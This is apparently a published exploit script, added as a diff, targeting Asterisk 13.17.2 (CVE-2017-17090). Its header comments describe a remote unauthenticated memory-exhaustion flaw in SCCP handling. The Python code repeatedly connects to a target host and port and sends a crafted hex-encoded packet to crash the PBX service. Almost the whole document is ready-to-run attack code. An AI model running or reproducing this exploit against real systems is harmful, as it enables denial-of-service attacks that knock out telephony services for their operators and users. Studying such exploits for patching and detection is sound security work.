@@ -1,0 +1,80 @@
+# Exploit Author: Juan Sacco <jsacco@exploitpack.com> - http://exploitpack.com
+# Vulnerability found using Exploit Pack v10 - Fuzzer module
+# CVE-2017-17090 -  AST-2017-013
+#
+# Tested on: Asterisk 13.17.2~dfsg-2
+#
+# Description: Asterisk is prone to a remote unauthenticated memory exhaustion
+# The vulnerability is due to an error when the vulnerable application
+# handles crafted SCCP packet. A remote attacker may be able to exploit
+# this to cause a denial of service condition on the affected system.
+#
+# [Nov 29 15:38:06] ERROR[7763] tcptls.c: TCP/TLS unable to launch
+# helper thread: Cannot allocate memory
+#
+# Program: Asterisk is an Open Source PBX and telephony toolkit.  It is, in a
+# sense, middleware between Internet and telephony channels on the bottom,
+# and Internet and telephony applications at the top.
+#
+# Homepage: http://www.asterisk.org/
+# Filename: pool/main/a/asterisk/asterisk_13.17.2~dfsg-2_i386.deb
+#
+# Example usage: python asteriskSCCP.py 192.168.1.1 2000
+
+import binascii
+import sys
+import socket
+import time
+
+def asteriskSCCP(target,port):
+    try:
+        while 1:
+            # Open socket
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Set reuse ON
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            # Bind port
+            s.connect((target, port))
+            print("[" + time.strftime('%a %H:%M:%S') + "]" + " - " + "Connected to:"), target, port
+            print("[" + time.strftime('%a %H:%M:%S') + "]" + " - " + "Establishing connection.. ")
+            packet =
+binascii.unhexlify(b'450002c50001000040067a307f0000017f000001001407d00000000000000000500220009a2b0000e4eea8a72a97467d3631824ac1c08c604e762eb80af46cc6d219a4cf65c13992b4a8af94cb5e87c14faf0254cba25af9fb33bd8d2a58e370e3a866639dfdec350875cfecfe068a16746963fffeee0fdcbac75eb4f09d625f3ae1b4a3eb2812e6f838e88b0d7d9881465a0faf45664df8008d4d6de1a5e20a9c97a71f57d3429e0b17db3aeb3bf516ca4e207a5c801d04132979508f267c7425a57fd0edd271b57ff9831b595b519e73404f170492ae3ad438d4aeca854e96c9dd56d2af3813b8de6b3d8d31d32c0e95be9cb3a5c6106f64c4f19cda2b55ad1471f3d63e1b1ca3c29f362def063ad9b29ea4d1c1fda5c2e4cf0ae75064c27411a2deb5fab11e6412cd5a4037f38779f0173fa1f2ca1740aa78fe37bc0a50f5619c7abba00f2957bf06770ff4d6c003d4533de19f51bcbbd9bbe0ceb3e17dd180e58ee2698998edca42e3d6a8079cc151b608e5bd5aff052e718e714b360f9b091894a5eeed34dafe41d27f19988b3e0ac5a6dd8947c3537ae31154e983cdbac0861afc500206e74030c9e452738ece13075df2dbebb8a1737ee3b4880bc6d428ee2d3d64f585e197dc63f30638a4c55cff0b8e6aa82dfdf199baabd92c10092414015fad5f08e9c816a4d028574ee5340c08b2fe65ca1e7ca907ea2ebd6661e01e9b9d39d5bdb3e3cebd58e96f97f487bb580bcf5447ac48a2ad5541ae0ddcc9ec1f9528f2c07316dbd760e91e3bddbd53fbf6987fdba0830bdb485524950b5611e18e5d517c0f3ae05aa2daec42a5c43eab07aa0018ab750dc6995adad6561cc8a0379f7a12d8e5e474df013459442801d6871c5820318d790833687619b70b0da74893ca441f177ab9e7d7a537c6ff4920c79631905c35167d8a6efc0c6bced9270691abc5b4de84f956f8c1d34f9ef3f0073dafce8c076c4d537e981a1e8ff6ed3e8c')
+
+            # Log the packet in hexa and timestamp
+            fileLog = target + ".log"
+            logPacket = open(fileLog, "w+")
+            logPacket.write("["+time.strftime('%a %H:%M:%S')+"]"+ " - Packet sent: " + binascii.hexlify(bytes(packet))+"\n")
+            logPacket.close()
+
+            # Write bytecodes to socket
+            print("["+time.strftime('%a %H:%M:%S')+"]"+" - "+"Packet sent: ")
+            s.send(bytes(packet))
+            # Packet sent:
+            print(bytes(packet))
+            try:
+                data = s.recv(4096)
+                print("[" + time.strftime('%a %H:%M:%S') + "]" + " - "+ "Data received: '{msg}'".format(msg=data))
+            except socket.error, e:
+                print 'Sorry, No data available'
+                continue
+        s.close()
+    except socket.error as error:
+        print error
+        print "Sorry, something went wrong!"
+
+def howtouse():
+    print "Usage: AsteriskSCCP.py Hostname Port"
+    print "[*] Mandatory arguments:"
+    print "[-] Specify a hostname / port"
+    sys.exit(-1)
+
+if __name__ == "__main__":
+    try:
+        # Set target
+        target = sys.argv[1]
+        port = int(sys.argv[2])
+
+        print "[*] Asterisk 13.17 Exploit by Juan Sacco <jsacco@exploitpack.com "
+        asteriskSCCP(target, port)
+    except IndexError:
+        howtouse()
